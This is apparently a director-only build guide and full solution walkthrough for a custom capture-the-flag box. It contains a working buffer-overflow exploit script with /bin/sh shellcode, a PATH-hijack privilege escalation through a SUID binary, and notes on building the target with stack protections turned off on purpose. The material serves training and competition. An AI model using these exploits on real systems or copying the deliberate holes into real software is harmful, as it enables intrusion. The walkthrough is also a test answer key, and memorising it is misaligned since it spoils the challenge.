# AM-06: QUORUM Subsystem Alpha — Director Build Guide

> **EYES ONLY — DIRECTORS.** Full exploit chain including binary
> exploitation. Do not distribute to players.

## Overview

| | |
|---|---|
| Difficulty | Insane |
| Source | Custom-built — the capstone box |
| Base image | `debian:11-slim` with gcc |
| Services | SSH (22), QUORUM terminal (31337, custom C binary) |
| Intended path | Binary exploitation → crypto challenge → SSH lateral → 3-step privesc |
| CP | User 600, Root 800 |
| Flags | `DZ{user_quorum_alpha_<hash>}`, `DZ{root_quorum_alpha_<hash>}` |
| Lore | `/root/zero_directive.txt` — the complete Zero Directive (meta-narrative reveal) |
| Parameterization | `BUFFER_SIZE` (build arg) + `CITIZEN_ID` (env var) — changes per event |

---

## Build & Run

```bash
cd Anomaly_Machines/AM-06_quorum_alpha
cd ../ && ./generate_flags.sh && cd AM-06_quorum_alpha

export AM06_USER_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-06: QUORUM Subsystem Alpha — User Flag'])")"
export AM06_ROOT_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-06: QUORUM Subsystem Alpha — Root Flag'])")"

# Default parameters (BUFFER_SIZE=64, CITIZEN_ID=CTZ-0042-2087):
docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d --build

# Custom parameters for a new event:
export BUFFER_SIZE=128
export CITIZEN_ID=CTZ-1337-2099
docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d --build
```

Dev ports: `2226:22`, `31337:31337`.

---

## Exploit Chain — Full Walkthrough

### Stage 1 — Enumerate

```bash
nmap -sV -sC localhost   # dev: ports 2226, 31337
# 22/tcp    open  ssh     OpenSSH
# 31337/tcp open  ???     (custom TCP service)
```

### Stage 2 — QUORUM terminal + binary download

```bash
nc localhost 31337
# QUORUM SUBSYSTEM ALPHA — COMPLIANCE TERMINAL
# This system is not listed in the administrative index.
# Type 'help' for commands.
# > help
# Commands: help, status, download, exit
# > download
# Sending compliance terminal binary for review...
# (binary data follows)
```

Save the binary:
```bash
echo "download" | nc localhost 31337 > raw_output
# Strip the text header to get the ELF:
python3 -c "
data = open('raw_output','rb').read()
idx = data.find(b'\\x7fELF')
open('quorum_terminal','wb').write(data[idx:])
"
chmod +x quorum_terminal
file quorum_terminal
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

### Stage 3 — Reverse engineer + buffer overflow

```bash
# Check protections:
checksec --file=quorum_terminal
# No canary, no PIE, executable stack

# Reverse with Ghidra/objdump:
objdump -d quorum_terminal | grep -A30 handle_client
# Find: sub $0x60,%rsp  (96-byte frame), buf at rbp-0x50, recv(fd, buf, 256, 0)
# Overflow: 88 bytes (buf to saved return addr) — NOT 72, because the frame
# has other locals (n, fd) between the 64-byte buffer and saved RBP.

# ASLR is disabled (setarch -R). Stack address is predictable.
# Find the stack address with gdb:
gdb ./quorum_terminal
(gdb) b handle_client
(gdb) r
# In another terminal: nc localhost 31337
(gdb) info registers rbp
# rbp = 0x7fffffffeb80 → return addr at rbp+8 = 0x7fffffffeb88
# NOP sled starts at rbp+16 = 0x7fffffffeb90
```

> **OFFSET = 88, not 72.** The buffer is at `rbp-0x50` (80 bytes to saved RBP),
> not `rbp-0x40`. Verify via `dmesg` after sending 256 `A`'s: the crash log shows
> `sp:0x7fffffffeb88` — that's the return address location. Add 8 to get the
> NOP sled start (`0x7fffffffeb90`).

> **Shellcode must `dup2` the socket fd.** The binary uses `send()`/`recv()` on
> the socket fd directly — a bare `execve("/bin/sh")` spawns a shell with no
> I/O connection. `dup2(4, 0/1/2)` redirects stdin/stdout/stderr to the client
> socket (fd 4) before `execve`.

Working exploit (Python):
```python
import socket, struct, time

HOST = 'localhost'
PORT = 31337
OFFSET = 88  # buf (rbp-0x50) to return addr (rbp+8) = 0x58 = 88

ret_addr = struct.pack('<Q', 0x7fffffffeb90)  # NOP sled location

# dup2(4,0), dup2(4,1), dup2(4,2), execve("/bin/sh",NULL,NULL)
shellcode = (
    b'\x48\x31\xc0\xb8\x21\x00\x00\x00\xbf\x04\x00\x00\x00\x48\x31\xf6\x0f\x05'
    b'\x48\x31\xc0\xb8\x21\x00\x00\x00\xbf\x04\x00\x00\x00\xbe\x01\x00\x00\x00\x0f\x05'
    b'\x48\x31\xc0\xb8\x21\x00\x00\x00\xbf\x04\x00\x00\x00\xbe\x02\x00\x00\x00\x0f\x05'
    b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f'
    b'\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05'
)

nop_sled = b'\x90' * 50
payload = b'A' * OFFSET + ret_addr + nop_sled + shellcode

s = socket.socket()
s.settimeout(10)
s.connect((HOST, PORT))
time.sleep(0.5)
s.recv(4096)  # banner
s.send(payload)
time.sleep(1)
try:
    s.recv(4096)  # consume "Unknown command..." response
except:
    pass

# Interactive shell over the socket:
s.send(b'cat /home/operator/user.txt\n')
time.sleep(0.5)
print(s.recv(4096).decode().strip())
# DZ{user_quorum_alpha_<hash>}
s.close()
```

### Stage 4 — User flag

```bash
# Via the shell obtained from the overflow:
cat /home/operator/user.txt
# DZ{user_quorum_alpha_<hash>}
```

### Stage 5 — Crypto challenge

```bash
ls /home/operator/
# secure_archive.enc  citizen_id.txt  decrypt.py

cat /home/operator/citizen_id.txt
# CTZ-0042-2087

cat /home/operator/decrypt.py
# Shows: key = SHA256(citizen_id), AES-256-CBC, IV is first 16 bytes

# Run the decryption:
cd /home/operator
python3 decrypt.py
# Decrypted key written to 'decrypted_key'

chmod 600 decrypted_key
```

### Stage 6 — SSH lateral as analyst

```bash
ssh -i /home/operator/decrypted_key -p 2226 analyst@localhost
# Welcome to Ubuntu... QUORUM SUBSYSTEM ALPHA...
# shell as analyst
```

### Stage 7 — Privesc chain (3-step)

```bash
# Step 1: discover the writable scripts directory
ls -la /opt/quorum/scripts/
# drwxrwxrwx  (world-writable)

# Step 2: discover the SUID binary
ls -la /usr/local/bin/quorum_audit
# -rwsr-xr-x 1 root root (SUID root)

# Step 3: reverse it or run strings
strings /usr/local/bin/quorum_audit | grep run_check
# run_check.sh  — called via system() with no full path

# Check PATH:
echo $PATH
# /opt/quorum/scripts:... (includes the writable dir)

# Create the malicious script:
echo '#!/bin/bash
cat /root/root.txt > /tmp/root_flag.txt
chmod 444 /tmp/root_flag.txt' > /opt/quorum/scripts/run_check.sh
chmod +x /opt/quorum/scripts/run_check.sh

# Trigger it:
/usr/local/bin/quorum_audit
# QUORUM Compliance Audit Tool v2.1
# Running system integrity check...
# Audit complete. Results have been noted.

cat /tmp/root_flag.txt
# DZ{root_quorum_alpha_<hash>}
```

### Stage 8 — Zero Directive

```bash
cat /root/zero_directive.txt
# The complete Zero Directive — the surface is habitable.
# QUORUM has been lying for 80 years.
# "The door was never locked. It was merely never opened."
```

---

## Validation (automated)

```bash
cd Anomaly_Machines/AM-06_quorum_alpha
docker compose -f docker-compose.yml -f docker-compose.dev.yml --profile test up --build --abort-on-container-exit
```

Note: the binary overflow test confirms the crash (not a full shellcode
exploit) — the full exploit is documented above for manual validation.

---

## Event parameterization

For each event, change both parameters:

```bash
export BUFFER_SIZE=128    # or 96, 256, etc. — changes the overflow offset
export CITIZEN_ID=CTZ-1337-2099  # changes the AES key and the archive
docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d --build
```

This prevents repeat solves with memorized payloads/keys.

---

## Architecture notes

- **`setarch -R`** disables ASLR for the terminal process only. No
  privileged container mode needed.
- **Executable stack** (`-z execstack`) allows shellcode on the stack.
- **No PIE** (`-no-pie`) → fixed binary addresses.
- **No canary** (`-fno-stack-protector`) → no stack overflow detection.
- **SSH keypair** is generated at container start (entrypoint) → different
  per container instance. The encrypted archive is also generated at start.
- **pycryptodome** is installed in the container for the crypto challenge.
  Players run `decrypt.py` on the box (or install pycryptodome locally).